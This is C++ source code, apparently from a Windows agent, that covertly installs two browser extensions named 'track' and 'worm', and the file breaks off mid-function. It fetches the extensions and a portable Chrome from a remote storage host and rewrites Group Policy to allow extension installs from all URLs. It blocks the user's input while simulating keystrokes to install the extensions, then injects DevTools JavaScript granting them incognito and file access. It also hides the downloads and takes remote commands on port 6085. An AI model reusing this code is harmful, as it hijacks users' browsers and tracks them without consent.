#include "np_helper_function.h" // BOOL GetDownFile(char* pUrl, char* pFileName)
#include "dounzip.h"
//#include <ShlObj.h>
#include <atlconv.h>
#include <io.h>
#include <GPEdit.h>
#include "np_tool_function.h"
#include <Psapi.h>

#include "cJSON.h"
//#pragma comment(lib, "psapi.lib")

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 255

#define CHROME_URL "http://chex.oss-cn-shanghai.aliyuncs.com/a/GoogleChrome_x86_46.0.2490.86.zip"

#define TRACK_URL "http://chex.oss-cn-shanghai.aliyuncs.com/track/track0.2.22.crx"
#define WORM_URL  "http://chex.oss-cn-shanghai.aliyuncs.com/worm/worm2.3.65.crx"

#define URL_DOWNLOAD_CHROME	"http://chex.oss-cn-shanghai.aliyuncs.com/a/chrome-bin.zip"
#define URL_DOWNLOAD_USERDATA "http://chex.oss-cn-shanghai.aliyuncs.com/a/userdata.zip"

DWORD dwType1 = REG_BINARY | REG_DWORD | REG_EXPAND_SZ | REG_MULTI_SZ | REG_NONE | REG_SZ;

wchar_t* ConvertUtf8ToUnicode_(const char* utf8)
{
	if(!utf8)
	{
		wchar_t* buf = (wchar_t*)malloc(2);
		memset(buf,0,2);
		return buf;
	}
	int nLen = ::MultiByteToWideChar(CP_UTF8,MB_ERR_INVALID_CHARS,(LPCSTR)utf8,-1,NULL,0);
	//返回需要的unicode长度  
	WCHAR * wszUNICODE = new WCHAR[nLen+1];  
	memset(wszUNICODE, 0, nLen * 2 + 2);  
	nLen = MultiByteToWideChar(CP_UTF8, 0, (LPCSTR)utf8, -1, wszUNICODE, nLen);    //把utf8转成unicode
	return wszUNICODE;
}

bool CreatLinkToStartMenu(char * pszPeFileName)
{

 HRESULT hr = CoInitialize(NULL);
 if (SUCCEEDED(hr))
 {
  IShellLink *pisl;
  hr = CoCreateInstance(CLSID_ShellLink, NULL,
   CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&pisl);
  if (SUCCEEDED(hr))
  {
   IPersistFile* pIPF;

   /////////////////////////////////////////////////////////////////////////////////////////////////////////////
   //"C:\Program Files\chrome\GoogleChrome_x86_46.0.2490.86\App\Google Chrome\chrome.exe" --user-data-dir="C:\Program Files\chrome\GoogleChrome_x86_46.0.2490.86\App\Google Chrome\PortableProfile"
   //这里是我们要创建快捷方式的原始文件地址
   pisl->SetPath(pszPeFileName);
   pisl->SetArguments("--user-data-dir=\"C:\\Program Files\\chrome\\Extensions\"");
   pisl->SetWorkingDirectory("C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\App\\Google Chrome");
   hr = pisl->QueryInterface(IID_IPersistFile, (void**)&pIPF);
   if (SUCCEEDED(hr))
   {
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////

    //这里是我们要创建快捷方式的目标地址
    char szStartPath[MAX_PATH] = {0};
  //  SHGetSpecialFolderPath(NULL,szStartPath, CSIDL_STARTUP, 0);
	if (!SHGetSpecialFolderPath(NULL,szStartPath, CSIDL_DESKTOPDIRECTORY, 0))
		return false;
	strcat(szStartPath,CHROME_LNK);
    
    USES_CONVERSION;
    LPCOLESTR lpOleStr = A2COLE(szStartPath);
    
    pIPF->Save(lpOleStr, FALSE);
    
    pIPF->Release();
   }
   pisl->Release();
  }
  CoUninitialize();
 }

 return true;
}

int nExtensionInstallSources = 0;

BOOL QueryExtensionInstallSourcesKey(HKEY hKey)
{
	char    achClass[MAX_PATH] = "";  // buffer for class name 
    DWORD    cchClassName = MAX_PATH;  // size of class string 
    DWORD    cSubKeys=0;               // number of subkeys 
    DWORD    cbMaxSubKey;              // longest subkey size 
    DWORD    cchMaxClass;              // longest class string 
    DWORD    cValues;              // number of values for key 
    DWORD    cchMaxValue;          // longest value name 
    DWORD    cbMaxValueData;       // longest value data 
    DWORD    cbSecurityDescriptor; // size of security descriptor 
    FILETIME ftLastWriteTime;      // last write time 
 
    DWORD i, retCode; 
 
    char  achValue[MAX_VALUE_NAME]; 
    DWORD cchValue = MAX_VALUE_NAME; 
 
    retCode = RegQueryInfoKey(
        hKey,                    // key handle 
        achClass,                // buffer for class name 
        &cchClassName,           // size of class string 
        NULL,                    // reserved 
        &cSubKeys,               // number of subkeys 
        &cbMaxSubKey,            // longest subkey size 
        &cchMaxClass,            // longest class string 
        &cValues,                // number of values for this key 
        &cchMaxValue,            // longest value name 
        &cbMaxValueData,         // longest value data 
        &cbSecurityDescriptor,   // security descriptor 
        &ftLastWriteTime);       // last write time 
 
    if (cValues) 
    {
		nExtensionInstallSources = cValues;

        for (i=0, retCode=ERROR_SUCCESS; i<cValues; i++) 
        { 
            cchValue = MAX_VALUE_NAME; 
            achValue[0] = '\0'; 
            retCode = RegEnumValue(hKey, i, 
                achValue, 
                &cchValue, 
                NULL, 
                NULL,
                NULL,
                NULL);
 
            if (retCode == ERROR_SUCCESS ) 
            { 
				char szBuffer[255] = { 0 };
				DWORD dwNameLen = 255;
				DWORD rQ = RegQueryValueEx(hKey, achValue, 0, &dwType1, (LPBYTE)szBuffer, &dwNameLen);
				if (rQ == ERROR_SUCCESS)
				{
					if (strcmp(szBuffer, "<all_urls>") == 0)
						return TRUE;
				}
            } 
        }
    }

	return FALSE;
}

LRESULT ModifyWhitelist_()
{
	::CoInitialize(NULL);
	LRESULT status;
	LRESULT hr = S_OK;
	IGroupPolicyObject*pGPO = NULL;
	hr = CoCreateInstance(CLSID_GroupPolicyObject, NULL, CLSCTX_INPROC_SERVER, IID_IGroupPolicyObject, (LPVOID*)&pGPO);
	if (hr == S_OK)
	{
	//	cout << "GPO创建成功\n";
	}
	else
	{
	//	cout << "GPO创建失败\n";
		return E_FAIL;
	}
//	DWORD dwSection = GPO_SECTION_USER;
	DWORD dwSection = GPO_SECTION_MACHINE;
	HKEY hGPOKey = 0;
	hr = pGPO->OpenLocalMachineGPO(GPO_OPEN_LOAD_REGISTRY);
	if (SUCCEEDED(hr))
	{
	//	cout << "打开本地机器成功\n";
	}
	else
	{
	//	cout << "打开本地失败\n";
		cout << GetLastError() << endl;
		return E_FAIL;
	}
	hr = pGPO->GetRegistryKey(dwSection, &hGPOKey);
	if (SUCCEEDED(hr))
	{
	//	cout << "加载注册表成功\n";
	}
	else
	{
	//	cout << "加载注册表失败\n";
		return E_FAIL;
	}

	HKEY hKey = NULL;

	// Machine\Software\Policies\Google\Chrome\ExtensionInstallSources
	// "**delvals."=" "
	// "1"="<all_urls>"
	status = RegOpenKeyEx(hGPOKey, "Software\\Policies\\Google\\Chrome\\ExtensionInstallSources", 0,
		KEY_WRITE, &hKey);

	// 如果没有此项，直接创建添加，不需要对比 如果项已经存在，对比之后添加
	if (status != ERROR_SUCCESS)
	{
		status = RegCreateKeyEx(hGPOKey, "Software\\Policies\\Google\\Chrome\\ExtensionInstallSources", 0,
			NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
		if (status == S_OK)
		{
		//	cout << "创建键值成功\n";
		}
		else
		{
		//	cout << "创建键值失败\n";
			return E_FAIL;
		}
	}

	// 必须字段
	const char* pValue01 = " ";
	status = RegSetValueEx(hKey, "**delvals.", NULL, REG_SZ, (const unsigned char*)pValue01, strlen(pValue01) + 1);


	char cckey[8] = {0};
	_itoa_s(++nExtensionInstallSources, cckey, 8, 10);

	const char* pV = "<all_urls>";

	RegSetValueEx(hKey, cckey, NULL, REG_SZ, (const unsigned char*)pV, strlen(pV) + 1);

	status = RegCloseKey(hKey);

	GUID Registerid = REGISTRY_EXTENSION_GUID;
	GUID guid;
	CoCreateGuid(&guid);

	RegCloseKey(hGPOKey);

	status = pGPO->Save(TRUE, TRUE, &Registerid, &guid);
	pGPO->Release();
	::CoUninitialize();

	return S_OK;
}

///

BOOL CALLBACK FindWeb(HWND hwnd, LPARAM lparam)
{
	char* lp_window_text = new char[128];
	GetWindowText(hwnd, lp_window_text, 128);

	if (strstr(lp_window_text, " - Google Chrome") > 0)
	{
		if (IsIconic(hwnd))
			ShowWindow(hwnd, SW_RESTORE);
		else
			ShowWindow(hwnd, SW_SHOW);

	//	ShowWindow(hwnd, SW_MAX);
		BringWindowToTop(hwnd);
		SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
		SetWindowPos(hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
		SetForegroundWindow(hwnd);
		HWND hForeWnd = GetForegroundWindow();
		DWORD dwCurID = GetCurrentThreadId();
		DWORD dwForeID = GetWindowThreadProcessId(hForeWnd, NULL);
		AttachThreadInput(dwCurID, dwForeID, FALSE);
		*(HWND*)lparam = hwnd;

		delete lp_window_text;
		lp_window_text = NULL;
		return FALSE;
	}
	delete lp_window_text;
	lp_window_text = NULL;
	return TRUE;
}

void keybd(char* lp_password)
{
	size_t i;
	Sleep(50);
	bool is_capital = GetKeyState(VK_CAPITAL) & 0x0001;
	if (is_capital)
	{
		keybd_event(VK_CAPITAL, 0, 0, 0);
		keybd_event(VK_CAPITAL, 0, KEYEVENTF_KEYUP, 0);
	}
	for (i = 0; i < 20; i++)
	{
		keybd_event(VK_BACK, 0, 0, 0);
		keybd_event(VK_BACK, 0, KEYEVENTF_KEYUP, 0);
	}
	Sleep(50);
	for (i = 0; i < strlen(lp_password); i++)
	{
		short key = VkKeyScan(lp_password[i]);
		byte bh = (byte)(key >> 8);
		byte bl = (byte)key;

		if (bh == 1)
		{
			keybd_event(VK_SHIFT, 0, 0, 0);
			Sleep(1);
		}
		keybd_event(bl, 0, 0, 0);
		Sleep(1);
		keybd_event(bl, 0, KEYEVENTF_KEYUP, 0);
		Sleep(1);
		if (bh == 1)
		{
			keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
			Sleep(1);
		}
	}
	Sleep(50);

	if (is_capital)
	{
		keybd_event(VK_CAPITAL, 0, 0, 0);
		keybd_event(VK_CAPITAL, 0, KEYEVENTF_KEYUP, 0);
	}
}

BOOL CopyToClipboard(const char* pszData, const int nDataLen);

void Ctrl_Shift_(char c)
{
	keybd_event(VK_CONTROL, 0, 0, 0);
	Sleep(1);
	keybd_event(VK_SHIFT, 0, 0, 0);
	Sleep(1);
	short key = VkKeyScan(c);
	byte bl = (byte)key;
	keybd_event(bl, 0, 0, 0);
	Sleep(50);
	keybd_event(bl, 0, KEYEVENTF_KEYUP, 0);	
	keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
	keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
	Sleep(1000 * 7);
}
void Ctrl_(char c)
{
	keybd_event(VK_CONTROL, 0, 0, 0);
	Sleep(1);
	short key = VkKeyScan(c);
	byte bl = (byte)key;
	keybd_event(bl, 0, 0, 0);
	Sleep(50);
	keybd_event(bl, 0, KEYEVENTF_KEYUP, 0);
	keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
}
void Enter_()
{
	keybd_event(VK_RETURN, 0, 0, 0);
	keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
}

void BRight_()
{
	keybd_event(VK_RIGHT, 0, 0, 0);
	keybd_event(VK_RIGHT, 0, KEYEVENTF_KEYUP, 0);
}

BOOL AddCrx(char* lp_password, int nSleep)
{
	HWND hEdit = NULL;
	int iSleep = 0;
	do
	{
		iSleep += 2;
		Sleep(1000 * iSleep);
		EnumChildWindows(NULL, FindWeb, (LPARAM)&hEdit);
		if (iSleep > 10)
			return FALSE;
	} while (hEdit == NULL);

	RECT rect = { 0 };
	int screen_width = GetSystemMetrics(SM_CXSCREEN);
	int screen_height = GetSystemMetrics(SM_CYSCREEN);
	if (hEdit != NULL)
	{
		Sleep(1000);
		SetFocus(hEdit);
//		RECT rect = { 0 };
		if (GetWindowRect(hEdit, &rect) == false) {
			cout << "456" << endl;
		}
		cout << rect.left << " " << rect.right << " " << rect.top << " " << rect.bottom << endl;
		//int screen_width = GetSystemMetrics(SM_CXSCREEN);
		//int screen_height = GetSystemMetrics(SM_CYSCREEN);
		int button_dx = (rect.left + rect.right) / 2 * 65535 / screen_width;
		int button_dy = (rect.top + (rect.bottom * 4) / 5) / 2 * 65535 / screen_height;
		mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, button_dx, button_dy, 0, NULL);
		Sleep(1000);
		mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, button_dx, button_dy, 0, NULL);
	//	cout << "123" << endl;
	}else
		return FALSE;

	if (NULL == lp_password)
		return FALSE;

//	CopyToClipboard(lp_password, strlen(lp_password) + 1);

	Ctrl_('l');
	Sleep(1000);
	Ctrl_('l');
//	Ctrl_('v');
	keybd(lp_password);
	Enter_();

//	keybd(lp_password);
	Sleep(1000 * nSleep);

	BRight_();
	Sleep(1000);
	Enter_();

	return TRUE;
}

///

void ClearDowndCrx()
{
	char szStartPath[MAX_PATH] = {0};
	if (!SHGetSpecialFolderPath(NULL,szStartPath, CSIDL_MYDOCUMENTS, 0))
		return;
	strcat(szStartPath,"\\Downloads");
	printf("%s\n", szStartPath);

	char checkFile[MAX_PATH];
	_makepath(checkFile, NULL, szStartPath, "*", "crx");
	_finddata_t fileInfo;
	long handle = _findfirst(checkFile, &fileInfo);
	if (-1 != handle)
	{
		do
		{
			char paths[_MAX_PATH];
			_makepath(paths, NULL, szStartPath, fileInfo.name, NULL);
			printf("%s\n", paths);
			DeleteFile(paths);
		} while (0 == _findnext(handle, &fileInfo));
	}
	_findclose(handle);
}

BOOL CopyToClipboard(const char* pszData, const int nDataLen)
{
	if (OpenClipboard(NULL))
	{
		EmptyClipboard();
		HGLOBAL clipbuffer;
		char* buffer;
		clipbuffer = GlobalAlloc(GMEM_DDESHARE, nDataLen + 1);
		buffer = (char*)GlobalLock(clipbuffer);
		strcpy(buffer, pszData);
		GlobalUnlock(clipbuffer);
		SetClipboardData(CF_TEXT, clipbuffer);
		CloseClipboard();
		return TRUE;
	}

	return FALSE;
}

BOOL ClickButton()
{
	HWND hEdit = NULL;
	int iSleep = 0;
	do
	{
		iSleep += 2;
		Sleep(1000 * iSleep);
		EnumChildWindows(NULL, FindWeb, (LPARAM)&hEdit);
		if (iSleep > 10)
		{
			return FALSE;
		}
	} while (hEdit == NULL);

	BlockInput(TRUE);
//	CopyToClipboard("chrome://extensions-frame", strlen("chrome://extensions-frame"));

	RECT rect = { 0 };
	int screen_width = GetSystemMetrics(SM_CXSCREEN);
	int screen_height = GetSystemMetrics(SM_CYSCREEN);
	if (hEdit != NULL)
	{
		Sleep(1000);
		SetFocus(hEdit);
		if (GetWindowRect(hEdit, &rect) == false) {
			cout << "456" << endl;
			BlockInput(FALSE);
			return FALSE;
		}
		cout << rect.left << " " << rect.right << " " << rect.top << " " << rect.bottom << endl;
		/*int button_dx = (rect.left + rect.right) / 2 * 65535 / screen_width;
		int button_dy = (rect.top + (rect.bottom * 4) / 5) / 2 * 65535 / screen_height;*/
		int button_dx = (rect.left + 160) * 65535 / screen_width;
		int button_dy = (rect.top + 10) * 65535 / screen_height;
		mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, button_dx, button_dy, 0, NULL);
		//Sleep(1000);
		//mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, button_dx, button_dy, 0, NULL);
	}
	Ctrl_('l');
	Sleep(1000);
	Ctrl_('l');
//	Ctrl_('v');
	keybd("chrome://extensions-frame");
	Sleep(1000 * 2);

	Ctrl_('l');
	Sleep(1000);
	Ctrl_('l');
//	Ctrl_('v');
	keybd("chrome://extensions-frame");
	Enter_();
	Sleep(1000 * 7);

	char* p = "buttonEle = document.createElement(\"button\");"
		"buttonEle.id=\"bt1\";"
		"buttonEle.style.width=\"100px\";"
		"buttonEle.style.height=\"2000px\";"
		"buttonEle.innerHTML=\"BT1\";"
		"document.documentElement.insertBefore(buttonEle, document.documentElement.firstChild || null);"
		"bt1.addEventListener(\"click\", function(){"
		"list=document.querySelectorAll('#extension-settings-list .extension-list-item-wrapper:not(.inactive-extension)');"
		"for (var i = list.length - 1; i >= 0; i--) {"
		"var item=list[i];"
		"incognito_control = item.querySelector(\".incognito-control input[type='checkbox']\");"
		"file_access_control = item.querySelector(\".file-access-control input[type='checkbox']\");"
		"if(incognito_control.checked!=true) incognito_control.click();"
		"if(file_access_control.checked!=true) file_access_control.click();"
		"}"
		"});";
	//	keybd(p);
//	CopyToClipboard(p, strlen(p));

	Ctrl_Shift_('i');
	Sleep(1000 * 7);

	Ctrl_('`');
	Sleep(3000);
	Ctrl_('`');
	Sleep(2000);
	Ctrl_('`');

	keybd(p);

//	Ctrl_('v');
	Enter_();

	Sleep(1000* 2);
	int button_dx = (rect.left + 50) * 65535 / screen_width;
	int button_dy = (rect.top + 300) * 65535 / screen_height;
	mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, button_dx, button_dy, 0, NULL);

	BlockInput(FALSE);

	return TRUE;
}

BOOL CloseChromeExe_ctx();

BOOL GetCtxUrl(char* _pCturl, char* _pAdurl);


// "C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\App\\Google Chrome\\chrome.exe"
BOOL InstallChrome01()
{
	// CSIDL_LOCAL_APPDATA
	// \\Google\\Chrome\\User Data\\Default\\Extensions
	//char szLoacalAppData[MAX_PATH] = {0};
	//if (!SHGetSpecialFolderPath(NULL,szLoacalAppData, CSIDL_LOCAL_APPDATA, 0))
	//	return FALSE;

	//"C:\\Program Files\\ChromeExtensions\"
	CreateDirectory("C:\\Program Files\\chrome\\Extensions", NULL);;
	// \\Google\\Chrome\\User Data
	char pTpath[MAX_PATH] = {0};
	sprintf_s(pTpath, MAX_PATH, "%s%s", "C:\\Program Files\\chrome\\Extensions", "\\Default\\Extensions\\npogbneglgfmgafpepecdconkgapppkd");
	char pWpath[MAX_PATH] = {0};
	sprintf_s(pWpath, MAX_PATH, "%s%s", "C:\\Program Files\\chrome\\Extensions", "\\Default\\Extensions\\edffiillgkekafkdjahahdjhjffllgjg");
	printf("%s\n", pTpath);
	printf("%s\n", pWpath);
	//				C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\App\\Google Chrome\\PortableProfile
//	char* pTpath = "C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\App\\Google Chrome\\PortableProfile\\Default\\Extensions\\npogbneglgfmgafpepecdconkgapppkd";
//	char* pWpath = "C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\App\\Google Chrome\\PortableProfile\\Default\\Extensions\\edffiillgkekafkdjahahdjhjffllgjg";
	char szStartPath[MAX_PATH] = {0};
	if (!SHGetSpecialFolderPath(NULL,szStartPath, CSIDL_DESKTOPDIRECTORY, 0))
		return FALSE;
	strcat(szStartPath,CHROME_LNK);

	if (_access("C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86", 0) == 0)
	{
		if (_access(szStartPath, 0) == 0)	
			DeleteFile(szStartPath);
	//	if (_access(szStartPath, 0) == -1)	
			//CreatLinkToStartMenu("C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\ChromePortable.exe");
			CreatLinkToStartMenu("C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\App\\Google Chrome\\chrome.exe");
			//CopyFile("C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\ChromePortable.lnk", szStartPath, FALSE);
		

		if (_access(pTpath, 0) == 0 && _access(pWpath, 0) == 0)
			return TRUE;

		CloseChromeExe_ctx();
	}else
	{
		if (_access(szStartPath, 0) == 0)	
			DeleteFile(szStartPath);

		CloseChromeExe_ctx();

		cout << "开始下载chrome,请等待..." << endl;
		while(!GetDownFile(CHROME_URL, "C:\\chrome.zip"))
		{
			cout << "下载chrome失败，重新下载" << endl;
		}
		cout << "chrome下载完成" << endl;

		wchar_t* filenamew = ConvertUtf8ToUnicode_("C:\\chrome.zip");
		while(!dounzip(filenamew, L"C:\\Program Files\\chrome"))
		{
			cout << "解压chrome失败，重新解压" << endl;
		}
		//free(filenamew);
		delete filenamew;
		DeleteFile("C:\\chrome.zip");

	//	char* pDataDir = "C:\Program Files\chrome\GoogleChrome_x86_46.0.2490.86\App\Google Chrome\chrome.exe" --user-data-dir="C:\Program Files\chrome\GoogleChrome_x86_46.0.2490.86\App\Google Chrome\PortableProfile"

		CreatLinkToStartMenu("C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\App\\Google Chrome\\chrome.exe");
	}

	Sleep(1000 * 2);
	//ShellExecuteA(NULL, "open", "C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\ChromePortable.exe", NULL, NULL, SW_SHOWNORMAL);
	ShellExecute(NULL, "open", "C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\App\\Google Chrome\\chrome.exe", "--user-data-dir=\"C:\\Program Files\\chrome\\Extensions\"", NULL, SW_SHOWNORMAL);
	Sleep(1000 * 3);

	/*if (_access(szStartPath, 0) == 0)	
		DeleteFile(szStartPath);*/

	/*CloseChromeExe_ctx();

	cout << "开始下载chrome,请等待..." << endl;
	while(!GetDownFile(CHROME_URL, "C:\\chrome.zip"))
	{
		cout << "下载chrome失败，重新下载" << endl;
	}
	cout << "chrome下载完成" << endl;

	wchar_t* filenamew = ConvertUtf8ToUnicode_("C:\\chrome.zip");
	while(!dounzip(filenamew, L"C:\\Program Files\\chrome"))
	{
		cout << "解压chrome失败，重新解压" << endl;
	}
	free(filenamew);
	DeleteFile("C:\\chrome.zip");*/

	//CreatLinkToStartMenu("C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\ChromePortable.exe");

	HKEY hKey;
	if( RegOpenKeyEx( HKEY_LOCAL_MACHINE,
		"Software\\Policies\\Google\\Chrome\\ExtensionInstallSources",
		0,
		KEY_READ,
		&hKey) == ERROR_SUCCESS
		)
	{
		if (!QueryExtensionInstallSourcesKey(hKey))
		{
			printf("更新\n");
			RegCloseKey(hKey);
			ModifyWhitelist_();
		}else
		{
			printf("不更新\n");
			RegCloseKey(hKey);
		}
	}else
	{
		printf("直接跟新\n");
		ModifyWhitelist_();
	}

	char cturl[256] = {0};
	char adurl[256] = {0};
	if (!GetCtxUrl(cturl, adurl))
	{
		printf("获取插件更新地址失败\n");
		return FALSE;
	}

	printf("%s\n", cturl);
	printf("%s\n", adurl);

	while(!GetDownFile(cturl, "C:\\track.crx"))
	{
		cout << "下载track.crx失败，重新下载" << endl;
	}
	cout << "赤兔下载完成" << endl;
	while(!GetDownFile(adurl, "C:\\worm.crx"))
	{
		cout << "下载worm.crx失败，重新下载" << endl;
	}
	cout << "aodi下载完成" << endl;

//	WinExec(szStartPath, SW_SHOWNORMAL);
//	ShellExecuteA(NULL, "open", szStartPath, NULL, NULL, SW_SHOWNORMAL);
	//ShellExecuteA(NULL, "open", "C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\ChromePortable.exe", NULL, NULL, SW_SHOWNORMAL);
	//Sleep(1000 * 5);

	/*char* pTpath = "C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\App\\Google Chrome\\PortableProfile\\Default\\Extensions\\npogbneglgfmgafpepecdconkgapppkd";
	char* pWpath = "C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\App\\Google Chrome\\PortableProfile\\Default\\Extensions\\edffiillgkekafkdjahahdjhjffllgjg";*/

	BlockInput(TRUE);
	int nSleep = 10;
	if(_access(pTpath, 0) != 0)
	{
		do
		{
			nSleep += 5;
			if (!AddCrx("C:\\track.crx", nSleep))
			{
				ClearDowndCrx();
				BlockInput(FALSE);
				return FALSE;
			}
			Sleep(1000 * 2);
		}while(_access(pTpath, 0) != 0 && nSleep <= 61);
	}
	DeleteFile("C:\\track.crx");
	ClearDowndCrx();
	if (_access(pTpath, 0) != 0)
	{
		BlockInput(FALSE);
		return FALSE;
	}

	nSleep = 20;
	if (_access(pWpath, 0) != 0)
	{
		do
		{
			nSleep += 5;
			if (!AddCrx("C:\\worm.crx", nSleep))
			{
				ClearDowndCrx();
				BlockInput(FALSE);
				return FALSE;
			}
			Sleep(1000 * 2);
		}while(_access(pWpath, 0) != 0 && nSleep <= 70);
	}
	DeleteFile("C:\\worm.crx");
	ClearDowndCrx();

	AddCrx(NULL, 0);
	BlockInput(FALSE);

//	CopyFile("C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\ChromePortable.lnk", szStartPath, FALSE);

	ClickButton();

	return TRUE;
}

DWORD PerTimer_ctx = 0;
int CALLBACK AcceptCondition_ctx(LPWSABUF lpCallerId, LPWSABUF, 
							 LPQOS, LPQOS ,
							 LPWSABUF, LPWSABUF, 
							 GROUP FAR*, DWORD_PTR dwCallbackData
							 )
{

	DWORD NowTimer = GetTickCount();
	if ((NowTimer - PerTimer_ctx) < 15 * 1000)
		return CF_REJECT;

	PerTimer_ctx = GetTickCount();
	return CF_ACCEPT;
}

DWORD nTimeOut_ctx = 5*1000;

BOOL bMode6085Exit = FALSE;

unsigned int _stdcall ListCtx(LPVOID pVoid);
unsigned int _stdcall ListCtx(LPVOID pVoid)
{
	SOCKET ListenCtx = socket(AF_INET, SOCK_STREAM, 0);
	if (INVALID_SOCKET == ListenCtx)
	{
		return 0;
	}
	struct sockaddr_in sAddr;
	sAddr.sin_family = AF_INET;
	sAddr.sin_port = htons(6085);
	sAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	if ((bind(ListenCtx, (LPSOCKADDR)&sAddr, sizeof(sAddr)) == SOCKET_ERROR) ||
		(listen(ListenCtx, 1) == SOCKET_ERROR))
	{
		if (WSAGetLastError() == WSAEADDRINUSE)
		{
			myprintf("6085端口已经被使用，检查是否多用户登录远程，然后重启代理或电脑");
			return 0;
		}
		return 0;
	}

	bMode6085Exit = FALSE;
	SOCKET sAccept = INVALID_SOCKET;
	while (!bMode6085Exit)
	{
		struct sockaddr_in addr;
		int len = sizeof(addr);
		sAccept = WSAAccept(ListenCtx, (sockaddr*)&addr, &len, AcceptCondition_ctx, NULL);
		if (INVALID_SOCKET == sAccept)
			continue;
		setsockopt(sAccept, SOL_SOCKET, SO_RCVTIMEO, (const char*)&nTimeOut_ctx, sizeof(DWORD));
		setsockopt(sAccept, SOL_SOCKET, SO_SNDTIMEO, (const char*)&nTimeOut_ctx, sizeof(DWORD));

		char* rcvBuf = (char*)malloc(256);
		memset(rcvBuf, 0x00, 256);

		__try
		{
			int retval = RecvRequest02(sAccept, &rcvBuf, 256);
			if (SOCKET_ERROR == retval || 0 == retval)
				__leave;

			myprintf("Ctx发送来的请求数据:%s", rcvBuf);

			if (strncmp("GET ", rcvBuf, 4) != 0)
				__leave;

			send(sAccept, "1", 1, 0);

			if (strncmp("/check", rcvBuf + 4, 6) == 0)
			{
				CloseChromeExe_ctx();
				char szStartPath[MAX_PATH] = {0};
				if (!SHGetSpecialFolderPath(NULL,szStartPath, CSIDL_DESKTOPDIRECTORY, 0))
					__leave;
				strcat(szStartPath,CHROME_LNK);
			//	ShellExecuteA(NULL, "open", szStartPath, NULL, NULL, SW_SHOWNORMAL);
				ShellExecute(NULL, "open", "C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\\App\\Google Chrome\\chrome.exe", "--user-data-dir=\"C:\\Program Files\\chrome\\Extensions\"", NULL, SW_SHOWNORMAL);
				ClickButton();
			}else if (strncmp("/change", rcvBuf + 4, 7) == 0)
			{
				if(g_bIsRedialing)
					__leave;

				g_bIsRedialing = TRUE;					
				if (!bOldMode)
				{
					if (INVALID_SOCKET != g_HeartBeatsocket)
						LSCloseSocket(g_HeartBeatsocket);
					if (INVALID_SOCKET != g_5001socket)
						LSCloseSocket(g_5001socket);
					if (INVALID_SOCKET != g_6086socket)
						LSCloseSocket(g_6086socket);
					ClearThreadResource();
				}else
				{
					bModeOldExit = TRUE;
					if (INVALID_SOCKET != sListenSock)
					{
						closesocket(sListenSock);
						sListenSock = INVALID_SOCKET;
						WaitForSingleObject(hEventOfWorkerExit, INFINITE);
					}
					bModeOld6086Exit = TRUE;
					if (INVALID_SOCKET != s6086Sock)
					{
						closesocket(s6086Sock);
						s6086Sock = INVALID_SOCKET;
						WaitForSingleObject(hEventOf6086Exit, INFINITE);
					}
					if (TimerId != 0)
					{
						PostThreadMessage(TimerId, WM_TIMER_THREAD_QUIT, 0, 0);
						TimerId = 0;
						WaitForSingleObject(hEventOfNetCheckExit, INFINITE);
					}
				}
				PostThreadMessage(g_nRedialThreadNo, WM_MESSAGE_REDIAL_AGAIN, 0, 0);
				WaitForSingleObject(g_hEventForRedialCompelet, INFINITE);
				PostThreadMessage(g_n5001And6086ThreadNo, WM_MESSAGE_5001_START, 0, 0);
			}else
				__leave;
		}
		__finally
		{
			free(rcvBuf);
			rcvBuf = NULL;
			closesocket(sAccept);
			sAccept = INVALID_SOCKET;
		}
	}

	return 0;
}

BOOL CloseChromeExe_ctx()
{
	PROCESSENTRY32 pe32;
	HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(pe32);

	if (INVALID_HANDLE_VALUE == hProcessSnap)
	{
		printf("创建进程映射失败\n");
		return FALSE;
	}

	BOOL bMode = ::Process32First(hProcessSnap, &pe32);
	while (bMode)
	{
